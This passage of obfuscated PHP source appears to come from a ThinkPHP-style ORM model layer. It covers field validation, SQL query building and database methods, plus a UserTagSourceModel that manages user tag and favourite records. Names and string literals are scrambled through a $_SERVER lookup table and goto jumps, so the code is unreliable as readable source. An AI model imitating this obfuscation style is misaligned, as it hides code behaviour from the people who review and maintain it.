$F™‚ÅâŸÎö[2] = think_lang(substr($F™‚ÅâŸÎö[2], 2, -1)); } $F™‚ÅâŸÎö[3] = isset($F™‚ÅâŸÎö[3]) ? $F™‚ÅâŸÎö[3] : THINK_EXISTS_VALIDATE; $F™‚ÅâŸÎö[4] = isset($F™‚ÅâŸÎö[4]) ? $F™‚ÅâŸÎö[4] : $bİóĞ•ô†¾[324]; switch ($F™‚ÅâŸÎö[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($D·Ö¾‚ÛÅ®, $F™‚ÅâŸÎö)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($bİóĞ•ô†¾[33] != trim($D·Ö¾‚ÛÅ®[$F™‚ÅâŸÎö[0]])) { if (!1 === $this->_validationField($D·Ö¾‚ÛÅ®, $F™‚ÅâŸÎö)) { return !1; } } break; default: if (isset($D·Ö¾‚ÛÅ®[$F™‚ÅâŸÎö[0]])) { if (!1 === $this->_validationField($D·Ö¾‚ÛÅ®, $F™‚ÅâŸÎö)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($FÕêõÙ‘°², $bŒÌ´×‘ø£) { if (!1 === $this->_validationFieldItem($FÕêõÙ‘°², $bŒÌ´×‘ø£)) { if ($this->patchValidate) { $this->error[$bŒÌ´×‘ø£[0]] = $bŒÌ´×‘ø£[2]; } else { $this->error = $bŒÌ´×‘ø£[2]; return !1; } } return; } protected function _validationFieldItem($E‘Ê™°Îá•, $fÃ…ÜëŒê„) { $fšŠò©°†¬ =& $_SERVER[Š‰]; switch (strtolower(trim($fÃ…ÜëŒê„[4]))) { case $fšŠò©°†¬[317]: case $fšŠò©°†¬[318]: $bĞºï†óŠÒ = isset($fÃ…ÜëŒê„[6]) ? (array) $fÃ…ÜëŒê„[6] : array(); if (is_string($fÃ…ÜëŒê„[0]) && strpos($fÃ…ÜëŒê„[0], $fšŠò©°†¬[47])) { $fÃ…ÜëŒê„[0] = explode($fšŠò©°†¬[47], $fÃ…ÜëŒê„[0]); } if (is_array($fÃ…ÜëŒê„[0])) { foreach ($fÃ…ÜëŒê„[0] as $e¸Ö ğ½†Ñ) { $cÜÔš’è„Å[$e¸Ö ğ½†Ñ] = $E‘Ê™°Îá•[$e¸Ö ğ½†Ñ]; } array_unshift($bĞºï†óŠÒ, $cÜÔš’è„Å); } else { array_unshift($bĞºï†óŠÒ, $E‘Ê™°Îá•[$fÃ…ÜëŒê„[0]]); } if ($fšŠò©°†¬[317] == $fÃ…ÜëŒê„[4]) { return call_user_func_array($fÃ…ÜëŒê„[1], $bĞºï†óŠÒ); } else { return call_user_func_array(array(&$this, $fÃ…ÜëŒê„[1]), $bĞºï†óŠÒ); } case $fšŠò©°†¬[325]: return $E‘Ê™°Îá•[$fÃ…ÜëŒê„[0]] == $E‘Ê™°Îá•[$fÃ…ÜëŒê„[1]]; case $fšŠò©°†¬[326]: if (is_string($fÃ…ÜëŒê„[0]) && strpos($fÃ…ÜëŒê„[0], $fšŠò©°†¬[47])) { $fÃ…ÜëŒê„[0] = explode($fšŠò©°†¬[47], $fÃ…ÜëŒê„[0]); } $bßÔèŠ‡Õ = array(); if (is_array($fÃ…ÜëŒê„[0])) { foreach ($fÃ…ÜëŒê„[0] as $e¸Ö ğ½†Ñ) { $bßÔèŠ‡Õ[$e¸Ö ğ½†Ñ] = $E‘Ê™°Îá•[$e¸Ö ğ½†Ñ]; } } else { $bßÔèŠ‡Õ[$fÃ…ÜëŒê„[0]] = $E‘Ê™°Îá•[$fÃ…ÜëŒê„[0]]; } if (!empty($E‘Ê™°Îá•[$this->getPk()])) { $bßÔèŠ‡Õ[$this->getPk()] = array($fšŠò©°†¬[327], $E‘Ê™°Îá•[$this->getPk()]); } if ($this->where($bßÔèŠ‡Õ)->find()) { return !1; } return !0; default: return $this->check($E‘Ê™°Îá•[$fÃ…ÜëŒê„[0]], $fÃ…ÜëŒê„[1], $fÃ…ÜëŒê„[4]); } } public function check($d©·¥ø‚„Ë, $cñíøí çŒ, $EÃÌ‡¼ Ğ– = "\162\x65\147\x65\x78") { $dÄ¨êè‹Àñ =& $_SERVER[Š‰]; $EÃÌ‡¼ Ğ– = strtolower(trim($EÃÌ‡¼ Ğ–)); switch ($EÃÌ‡¼ Ğ–) { case $dÄ¨êè‹Àñ[7]: case $dÄ¨êè‹Àñ[328]: $Bõ•µ³Í‡ = is_array($cñíøí çŒ) ? $cñíøí çŒ : explode($dÄ¨êè‹Àñ[47], $cñíøí çŒ); return $EÃÌ‡¼ Ğ– == $dÄ¨êè‹Àñ[7] ? in_array($d©·¥ø‚„Ë, $Bõ•µ³Í‡) : !in_array($d©·¥ø‚„Ë, $Bõ•µ³Í‡); case $dÄ¨êè‹Àñ[329]: case $dÄ¨êè‹Àñ[330]: if (is_array($cñíøí çŒ)) { $f…ÆíĞŞ‚ = $cñíøí çŒ[0]; $EÆÙ›ÉàÄ = $cñíøí çŒ[1]; } else { list($f…ÆíĞŞ‚, $EÆÙ›ÉàÄ) = explode($dÄ¨êè‹Àñ[47], $cñíøí çŒ); } return $EÃÌ‡¼ Ğ– == $dÄ¨êè‹Àñ[329] ? $d©·¥ø‚„Ë >= $f…ÆíĞŞ‚ && $d©·¥ø‚„Ë <= $EÆÙ›ÉàÄ : $d©·¥ø‚„Ë < $f…ÆíĞŞ‚ || $d©·¥ø‚„Ë > $EÆÙ›ÉàÄ; case $dÄ¨êè‹Àñ[331]: case $dÄ¨êè‹Àñ[332]: return $EÃÌ‡¼ Ğ– == $dÄ¨êè‹Àñ[331] ? $d©·¥ø‚„Ë == $cñíøí çŒ : $d©·¥ø‚„Ë != $cñíøí çŒ; case $dÄ¨êè‹Àñ[333]: $B°ã¡ÑåŠ = mb_strlen($d©·¥ø‚„Ë, $dÄ¨êè‹Àñ[334]); if (strpos($cñíøí çŒ, $dÄ¨êè‹Àñ[47])) { list($f…ÆíĞŞ‚, $EÆÙ›ÉàÄ) = explode($dÄ¨êè‹Àñ[47], $cñíøí çŒ); return $B°ã¡ÑåŠ >= $f…ÆíĞŞ‚ && $B°ã¡ÑåŠ <= $EÆÙ›ÉàÄ; } else { return $B°ã¡ÑåŠ == $cñíøí çŒ; } case $dÄ¨êè‹Àñ[335]: list($a¤Ö†¯‰á, $E¦Ä­³õ˜) = explode($dÄ¨êè‹Àñ[47], $cñíøí çŒ); if (!is_numeric($a¤Ö†¯‰á)) { $a¤Ö†¯‰á = strtotime($a¤Ö†¯‰á); } if (!is_numeric($E¦Ä­³õ˜)) { $E¦Ä­³õ˜ = strtotime($E¦Ä­³õ˜); } return NOW_TIME >= $a¤Ö†¯‰á && NOW_TIME <= $E¦Ä­³õ˜; case $dÄ¨êè‹Àñ[336]: return in_array(get_client_ip(), explode($dÄ¨êè‹Àñ[47], $cñíøí çŒ)); case $dÄ¨êè‹Àñ[337]: return !in_array(get_client_ip(), explode($dÄ¨êè‹Àñ[47], $cñíøí çŒ)); case $dÄ¨êè‹Àñ[324]: default: return $this->regex($d©·¥ø‚„Ë, $cñíøí çŒ); } } public function query($D§ßÊˆÍ„, $F¢ø®á¡ºŒ = false) { $DöÉ­ñ™Ñ =& $_SERVER[Š‰]; if (!is_bool($F¢ø®á¡ºŒ) && !is_array($F¢ø®á¡ºŒ)) { $F¢ø®á¡ºŒ = func_get_args(); array_shift($F¢ø®á¡ºŒ); } $D§ßÊˆÍ„ = str_replace(array($DöÉ­ñ™Ñ[227], $DöÉ­ñ™Ñ[338]), $DöÉ­ñ™Ñ[50], $D§ßÊˆÍ„); $D§ßÊˆÍ„ = $this->parseSql($D§ßÊˆÍ„, $F¢ø®á¡ºŒ); return $this->db->query($D§ßÊˆÍ„); } public function execute($C´î›Â¸øò, $eÚØ×˜›ã½ = false) { if (!is_bool($eÚØ×˜›ã½) && !is_array($eÚØ×˜›ã½)) { $eÚØ×˜›ã½ = func_get_args(); array_shift($eÚØ×˜›ã½); } $C´î›Â¸øò = $this->parseSql($C´î›Â¸øò, $eÚØ×˜›ã½); return $this->db->execute($C´î›Â¸øò); } protected function parseSql($A» ¾ßİÀ, $CèÑä· îÉ) { $f«Û•ºÁ¸¿ =& $_SERVER[Š‰]; if (!0 === $CèÑä· îÉ) { $Déà¡Ôˆ¹ = $this->_parseOptions(); $A» ¾ßİÀ = $this->db->parseSql($A» ¾ßİÀ, $Déà¡Ôˆ¹); } elseif (is_array($CèÑä· îÉ)) { $CèÑä· îÉ = array_map(array($this->db, $f«Û•ºÁ¸¿[339]), $CèÑä· îÉ); $A» ¾ßİÀ = vsprintf($A» ¾ßİÀ, $CèÑä· îÉ); } else { $A» ¾ßİÀ = strtr($A» ¾ßİÀ, array($f«Û•ºÁ¸¿[340] => $this->getTableName(), $f«Û•ºÁ¸¿[341] => think_config($f«Û•ºÁ¸¿[240]))); } $this->db->setModel($this->name); return $A» ¾ßİÀ; } public function db($C ê¦ĞÖŒ± = '', $fĞ¡Ô“İÆâ = '', $Dà¥á™©İŒ = array()) { goto cô²•šäÈ´; cô²•šäÈ´: $BÇ‚¾é£Òƒ =& $_SERVER[Š‰]; if ($BÇ‚¾é£Òƒ[33] === $C ê¦ĞÖŒ± && $this->db) { return $this->db; } static $a·Í¤Î²Õ = array(); goto CŞÄ‡…™½Î; cÕ¶ƒ•ŠÅŒ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto a¯èÒ°ğœõ; fƒ·Òì«: $a·Í¤Î²Õ[$C ê¦ĞÖŒ±] = $fĞ¡Ô“İÆâ; $this->db = $Bˆè·ƒ”[$C ê¦ĞÖŒ±]; $this->_after_db(); goto cÕ¶ƒ•ŠÅŒ; CŞÄ‡…™½Î: static $Bˆè·ƒ” = array(); if (!isset($Bˆè·ƒ”[$C ê¦ĞÖŒ±]) || isset($Bˆè·ƒ”[$C ê¦ĞÖŒ±]) && $fĞ¡Ô“İÆâ && $a·Í¤Î²Õ[$C ê¦ĞÖŒ±] != $fĞ¡Ô“İÆâ) { if (!empty($fĞ¡Ô“İÆâ) && is_string($fĞ¡Ô“İÆâ) && !1 === strpos($fĞ¡Ô“İÆâ, $BÇ‚¾é£Òƒ[8])) { $fĞ¡Ô“İÆâ = think_config($fĞ¡Ô“İÆâ); } $Bˆè·ƒ”[$C ê¦ĞÖŒ±] = Db::getInstance($fĞ¡Ô“İÆâ); } elseif (NULL === $fĞ¡Ô“İÆâ) { $Bˆè·ƒ”[$C ê¦ĞÖŒ±]->close(); unset($Bˆè·ƒ”[$C ê¦ĞÖŒ±]); return; } if (!empty($Dà¥á™©İŒ)) { if (is_string($Dà¥á™©İŒ)) { parse_str($Dà¥á™©İŒ, $Dà¥á™©İŒ); } foreach ($Dà¥á™©İŒ as $dó‹Úç°Èó => $D’À†ºÉãé) { $this->setProperty($dó‹Úç°Èó, $D’À†ºÉãé); } } goto fƒ·Òì«; a¯èÒ°ğœõ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $C¿ºåø°Ş÷ = get_class($this); if ($C¿ºåø°Ş÷ == $_SERVER[Š‰][342]) { return $this->name; } $this->name = substr($C¿ºåø°Ş÷, 0, -5); } return $this->name; } public function getTableName() { $C¼éÓŒÕ‘Œ =& $_SERVER[Š‰]; if (empty($this->trueTableName)) { $d„ù‡õ’ô® = !empty($this->tablePrefix) ? $this->tablePrefix : $C¼éÓŒÕ‘Œ[33]; if (!empty($this->tableName)) { $d„ù‡õ’ô® .= $this->tableName; } else { $d„ù‡õ’ô® .= think_parse_name($this->name); } $this->trueTableName = strtolower($d„ù‡õ’ô®); } return (!empty($this->dbName) ? $this->dbName . $C¼éÓŒÕ‘Œ[94] : $C¼éÓŒÕ‘Œ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $D¤Œ·‰½š¢ =& $_SERVER[Š‰]; return isset($this->fields[$D¤Œ·‰½š¢[247]]) ? $this->fields[$D¤Œ·‰½š¢[247]] : $this->pk; } public function getDbFields() { $dÉ¤Åà´Åø =& $_SERVER[Š‰]; if (isset($this->options[$dÉ¤Åà´Åø[275]])) { $AßàèİÑ«Æ = $this->db->getFields($this->options[$dÉ¤Åà´Åø[275]]); return $AßàèİÑ«Æ ? array_keys($AßàèİÑ«Æ) : !1; } if ($this->fields) { $AßàèİÑ«Æ = $this->fields; unset($AßàèİÑ«Æ[$dÉ¤Åà´Åø[246]], $AßàèİÑ«Æ[$dÉ¤Åà´Åø[247]], $AßàèİÑ«Æ[$dÉ¤Åà´Åø[248]], $AßàèİÑ«Æ[$dÉ¤Åà´Åø[245]]); return $AßàèİÑ«Æ; } return !1; } public function data($CÂØãè¿í‚ = '') { $DÅ¹øºŸÊÓ =& $_SERVER[Š‰]; if ($DÅ¹øºŸÊÓ[33] === $CÂØãè¿í‚ && !empty($this->data)) { return $this->data; } if (is_object($CÂØãè¿í‚)) { $CÂØãè¿í‚ = get_object_vars($CÂØãè¿í‚); } elseif (is_string($CÂØãè¿í‚)) { parse_str($CÂØãè¿í‚, $CÂØãè¿í‚); } elseif (!is_array($CÂØãè¿í‚)) { think_exception(think_lang($DÅ¹øºŸÊÓ[267])); } $this->data = $CÂØãè¿í‚; return $this; } public function join($FùË…öñ‰‹) { $a¯å¡Úá» =& $_SERVER[Š‰]; if (is_array($FùË…öñ‰‹)) { $this->options[$a¯å¡Úá»[278]] = $FùË…öñ‰‹; } elseif (!empty($FùË…öñ‰‹)) { $this->options[$a¯å¡Úá»[278]][] = $FùË…öñ‰‹; } return $this; } public function union($Aó£¨ŸŸô, $EèÃÓôƒ›í = false) { goto bÇ¿©Ó¦; B¼ãìŸØ: if (is_object($Aó£¨ŸŸô)) { $Aó£¨ŸŸô = get_object_vars($Aó£¨ŸŸô); } if (is_string($Aó£¨ŸŸô)) { $D•öé“’Êô = $Aó£¨ŸŸô; } elseif (is_array($Aó£¨ŸŸô)) { if (isset($Aó£¨ŸŸô[0])) { $this->options[$bÓ¢‘÷ˆ¤‘[343]] = array_merge($this->options[$bÓ¢‘÷ˆ¤‘[343]], $Aó£¨ŸŸô); return $this; } else { $D•öé“’Êô = $Aó£¨ŸŸô; } } else { think_exception(think_lang($bÓ¢‘÷ˆ¤‘[267])); } $this->options[$bÓ¢‘÷ˆ¤‘[343]][] = $D•öé“’Êô; goto eˆóëì¤åé; bÇ¿©Ó¦: $bÓ¢‘÷ˆ¤‘ =& $_SERVER[Š‰]; if (empty($Aó£¨ŸŸô)) { return $this; } if ($EèÃÓôƒ›í) { $this->options[$bÓ¢‘÷ˆ¤‘[343]][$bÓ¢‘÷ˆ¤‘[344]] = !0; } goto B¼ãìŸØ; eˆóëì¤åé: return $this; goto bº²¤¤¢µÌ; bº²¤¤¢µÌ: } public function cache($f£‚õïôÛ± = true, $d½›’£ÇÍ’ = null, $eÓš†Ê—¥Ï = '') { $e±Œ‚ÍÊ®é =& $_SERVER[Š‰]; if (!1 !== $f£‚õïôÛ±) { $this->options[$e±Œ‚ÍÊ®é[345]] = array($e±Œ‚ÍÊ®é[92] => $f£‚õïôÛ±, $e±Œ‚ÍÊ®é[335] => $d½›’£ÇÍ’, $e±Œ‚ÍÊ®é[29] => $eÓš†Ê—¥Ï); } return $this; } public function field($dÀÊÜ™ï°Ü, $cÃÊÒç®®ª = false) { $bª‹‡˜Ë® =& $_SERVER[Š‰]; if (!0 === $dÀÊÜ™ï°Ü) { $C£¤Ìºö = $this->getDbFields(); $dÀÊÜ™ï°Ü = $C£¤Ìºö ? $C£¤Ìºö : $bª‹‡˜Ë®[182]; } elseif ($cÃÊÒç®®ª) { if (is_string($dÀÊÜ™ï°Ü)) { $dÀÊÜ™ï°Ü = explode($bª‹‡˜Ë®[47], $dÀÊÜ™ï°Ü); } $C£¤Ìºö = $this->getDbFields(); $dÀÊÜ™ï°Ü = $C£¤Ìºö ? array_diff($C£¤Ìºö, $dÀÊÜ™ï°Ü) : $dÀÊÜ™ï°Ü; } $this->options[$bª‹‡˜Ë®[269]] = $dÀÊÜ™ï°Ü; return $this; } public function scope($EÊ¼¥à§® = '', $BÔ½°—ÅÉ = NULL) { $bÅÏªÆÃÙ =& $_SERVER[Š‰]; if ($bÅÏªÆÃÙ[33] === $EÊ¼¥à§®) { if (isset($this->_scope[$bÅÏªÆÃÙ[34]])) { $Fµ…®š¢± = $this->_scope[$bÅÏªÆÃÙ[34]]; } else { return $this; } } elseif (is_string($EÊ¼¥à§®)) { $e¤‚¬ğñ”Ì = explode($bÅÏªÆÃÙ[47], $EÊ¼¥à§®); $Fµ…®š¢± = array(); foreach ($e¤‚¬ğñ”Ì as $DÔ—ŞÈ«Ä) { if (!isset($this->_scope[$DÔ—ŞÈ«Ä])) { continue; } $Fµ…®š¢± = array_merge($Fµ…®š¢±, $this->_scope[$DÔ—ŞÈ«Ä]); } if (!empty($BÔ½°—ÅÉ) && is_array($BÔ½°—ÅÉ)) { $Fµ…®š¢± = array_merge($Fµ…®š¢±, $BÔ½°—ÅÉ); } } elseif (is_array($EÊ¼¥à§®)) { $Fµ…®š¢± = $EÊ¼¥à§®; } if (is_array($Fµ…®š¢±) && !empty($Fµ…®š¢±)) { $this->options = array_merge($this->options, array_change_key_case($Fµ…®š¢±)); } return $this; } public function where($e¦´ èÛİ, $A¤ß—±â†ğ = null) { $D¦œ‹áù½¹ =& $_SERVER[Š‰]; if (!is_null($A¤ß—±â†ğ) && is_string($e¦´ èÛİ)) { if (!is_array($A¤ß—±â†ğ)) { $A¤ß—±â†ğ = func_get_args(); array_shift($A¤ß—±â†ğ); } $A¤ß—±â†ğ = array_map(array($this->db, $D¦œ‹áù½¹[339]), $A¤ß—±â†ğ); $e¦´ èÛİ = vsprintf($e¦´ èÛİ, $A¤ß—±â†ğ); } elseif (is_object($e¦´ èÛİ)) { $e¦´ èÛİ = get_object_vars($e¦´ èÛİ); } elseif (is_array($e¦´ èÛİ)) { foreach ($e¦´ èÛİ as $b½¢‚øÊÎ‰ => $FåÂ¹Æà„÷) { if ((is_numeric($b½¢‚øÊÎ‰) || !$b½¢‚øÊÎ‰) && is_string($FåÂ¹Æà„÷)) { if (strpos($FåÂ¹Æà„÷, $D¦œ‹áù½¹[346]) === 0) { continue; } think_trace($D¦œ‹áù½¹[347], $D¦œ‹áù½¹[33], $D¦œ‹áù½¹[46]); die; } } } if (is_string($e¦´ èÛİ) && $D¦œ‹áù½¹[33] != $e¦´ èÛİ) { $bƒŸ¬çÖª = array(); $bƒŸ¬çÖª[$D¦œ‹áù½¹[348]] = $e¦´ èÛİ; $e¦´ èÛİ = $bƒŸ¬çÖª; } if (isset($this->options[$D¦œ‹áù½¹[271]])) { $this->options[$D¦œ‹áù½¹[271]] = array_merge($this->options[$D¦œ‹áù½¹[271]], $e¦´ èÛİ); } else { $this->options[$D¦œ‹áù½¹[271]] = $e¦´ èÛİ; } return $this; } public function limit($a‚çêŠ…–à, $Dò¾ÔøÔçİ = null) { $eÖ…æ‘°Ïæ =& $_SERVER[Š‰]; $this->options[$eÖ…æ‘°Ïæ[288]] = is_null($Dò¾ÔøÔçİ) ? $a‚çêŠ…–à : $a‚çêŠ…–à . $eÖ…æ‘°Ïæ[47] . $Dò¾ÔøÔçİ; return $this; } public function page($b™æÑ®¤®ò, $C‹›Ô×†ñÔ = null) { $DŒ¶÷©ĞÖä =& $_SERVER[Š‰]; $this->options[$DŒ¶÷©ĞÖä[349]] = is_null($C‹›Ô×†ñÔ) ? $b™æÑ®¤®ò : $b™æÑ®¤®ò . $DŒ¶÷©ĞÖä[47] . $C‹›Ô×†ñÔ; return $this; } public function comment($A¤ÌñÈîŠò) { $this->options[$_SERVER[Š‰][350]] = $A¤ÌñÈîŠò; return $this; } public function setProperty($e×íÌòé, $Eâ’²Ò®‘÷) { if (property_exists($this, $e×íÌòé)) { $this->{$e×íÌòé} = $Eâ’²Ò®‘÷; } return $this; } } goto D§¨“«³é˜; fËÂÃÁ›Õ¥: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($e»ˆÙ„íÒ) { $DÊªå¶Ÿäå =& $_SERVER[Š‰]; return array($DÊªå¶Ÿäå[1766] => array(USER_ID, $DÊªå¶Ÿäå[1767])); } protected function listData() { $CğéÎ®šš§ =& $_SERVER[Š‰]; $f¯’„ø¨Î÷ = array($CğéÎ®šš§[1492] => USER_ID, $CğéÎ®šš§[457] => array($CğéÎ®šš§[1770], 0)); $bï›ñİ‘¯ = $CğéÎ®šš§[1772]; $F¥Ò†™øÍØ = $this->field($bï›ñİ‘¯)->where($f¯’„ø¨Î÷)->order($CğéÎ®šš§[1773])->select(); return $F¥Ò†™øÍØ ? $F¥Ò†™øÍØ : array(); } protected function listByTag($FÂó¡öÓ¨) { } protected function addToTag($fÚ°÷£ó›Ş, $cÕ‰èËÜ„¿) { $d±¸ª¿ÑŸ‘ =& $_SERVER[Š‰]; if (!Model($d±¸ª¿ÑŸ‘[1907])->listData($cÕ‰èËÜ„¿) || !Model($d±¸ª¿ÑŸ‘[775])->pathInfo($fÚ°÷£ó›Ş)) { return !1; } $cš§Ôµ£Ë£ = array($d±¸ª¿ÑŸ‘[1492] => USER_ID, $d±¸ª¿ÑŸ‘[457] => $cÕ‰èËÜ„¿, $d±¸ª¿ÑŸ‘[408] => $fÚ°÷£ó›Ş, $d±¸ª¿ÑŸ‘[409] => $d±¸ª¿ÑŸ‘[403], $d±¸ª¿ÑŸ‘[407] => $d±¸ª¿ÑŸ‘[33], $d±¸ª¿ÑŸ‘[1667] => 0); if ($this->where($cš§Ôµ£Ë£)->find()) { return !1; } return $this->add($cš§Ôµ£Ë£); } protected function removeFromTag($Cõ²Ôã£ÓØ, $dÊ×“ëµó˜) { $bÄíÖ–ì’‹ =& $_SERVER[Š‰]; if (!Model($bÄíÖ–ì’‹[1907])->listData($dÊ×“ëµó˜)) { return !1; } if (is_array($Cõ²Ôã£ÓØ)) { $Cõ²Ôã£ÓØ = array($bÄíÖ–ì’‹[7], $Cõ²Ôã£ÓØ); } $Cá…Í°Ñ¼‚ = array($bÄíÖ–ì’‹[1492] => USER_ID, $bÄíÖ–ì’‹[457] => $dÊ×“ëµó˜, $bÄíÖ–ì’‹[409] => $bÄíÖ–ì’‹[403], $bÄíÖ–ì’‹[408] => $Cõ²Ôã£ÓØ); return $this->where($Cá…Í°Ñ¼‚)->delete(); } protected function removeByTag($B³Ú‡¸ã¹õ) { $F†ŸˆºôŞœ =& $_SERVER[Š‰]; if (!$B³Ú‡¸ã¹õ) { return !1; } $d Ê…­ˆÈ = array($F†ŸˆºôŞœ[1492] => USER_ID, $F†ŸˆºôŞœ[457] => $B³Ú‡¸ã¹õ); return $this->where($d Ê…­ˆÈ)->delete(); } protected function removeBySource($c²‰øŒç…) { $DÙÆÔõÍœã =& $_SERVER[Š‰]; if (is_array($c²‰øŒç…)) { $c²‰øŒç… = array($DÙÆÔõÍœã[7], $c²‰øŒç…); } $EĞµèÄ¶± = array($DÙÆÔõÍœã[1492] => USER_ID, $DÙÆÔõÍœã[408] => $c²‰øŒç…, $DÙÆÔõÍœã[457] => array($DÙÆÔõÍœã[948], 0)); return $this->where($EĞµèÄ¶±)->delete(); } }